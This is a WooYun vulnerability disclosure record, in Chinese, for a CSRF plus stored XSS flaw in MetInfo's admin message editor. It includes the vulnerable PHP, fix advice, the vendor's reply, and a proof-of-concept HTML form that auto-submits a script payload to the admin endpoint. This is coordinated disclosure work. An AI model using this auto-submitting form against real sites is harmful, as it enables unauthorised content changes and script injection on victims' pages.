{"id": 36213, "wybug_id": "wooyun-2015-0102382", "wybug_title": "MetInfo最新版csrf+xss", "wybug_corp": "MetInfo", "wybug_author": "Ader_duo", "wybug_date": "2015-03-19 17:25", "wybug_open_date": "2015-06-18 11:12", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向公众公开  简要描述：  \tcsrf+xss  详细说明：  漏洞所在文件：\\admin\\content\\message\\editor.php分析知，对post数据值未进行过滤，直接插入数据库。参数readok=1代表在前台显示此条数据。且未做csrf防护，我们可以利用csrf让他在前台显示另外编辑文件成功之后，看前台留言显示页面是如何从数据库里调出来的。\\message\\index.php\nrequire_once '../public/php/methtml.inc.php';$methtml_messagelist.=\"<ul>\\n\";foreach($message_list as $key=>$val){    $messagesName1=$db->get_one(\"select value from $met_config where name='met_message_fd_class' and lang='$lang'\");    $messagesNames1=$db->get_one(\"select info from $met_mlist where listid='$val[id]' and paraid='$messagesName1[value]' and lang='$lang'\");    $messagesName2=$db->get_one(\"select value from $met_config where name='met_message_fd_content' and lang='$lang'\");    $messagesNames2=$db->get_one(\"select info from $met_mlist where listid='$val[id]' and paraid='$messagesName2[value]' and lang='$lang'\");    $methtml_messagelist.=\"<li class='message_list_line'><span >[NO\".$val[id].\"]：<b>\".$messagesNames1[info].\"</b> \".$lang_Publish.\" \".$val[addtime].\"</span></li>\\n\";    $methtml_messagelist.=\"<li class='message_list_info'><span ><b>\".$lang_SubmitContent.\"</b>:\".$messagesNames2[info].\"</span></li>\\n\";    $methtml_messagelist.=\"<li class='message_list_reinfo'><span ><b>\".$lang_Reply.\"</b>:\".$val[useinfo].\"</span></li>\\n\";    }\n在这里是将后台内容显示在前台的。分析知也未进行过滤，直接从数据库查询出就显示了。利用代码   1.php<form action=\"http://127.0.0.1/metinfo/admin/content/message/editor.php?anyid=29&action=editor&lang=cn&class1=25&customerid=\" method=\"post\" name=\"c\"><input type=\"text\" name=\"id\" value=\"2\"/><input type=\"text\" name=\"para119\" value=\"<script>alert(1)</script>\"><input type=\"text\" name=\"readok\" value=\"1\"></form> <script> document.c.submit(); </script>   漏洞证明：  管理员登陆状态下打开1.php文件自动编辑成功。这时，前台-关于我们-在线留言。触发漏洞\n\n   修复方案：  加token。验证referer更新数据库和查询数据库时都对数据过滤。    版权声明：转载请注明来源 Ader_duo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-03-20 11:11 厂商回复： 谢谢您的反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-13 10:41 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  学习了！    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}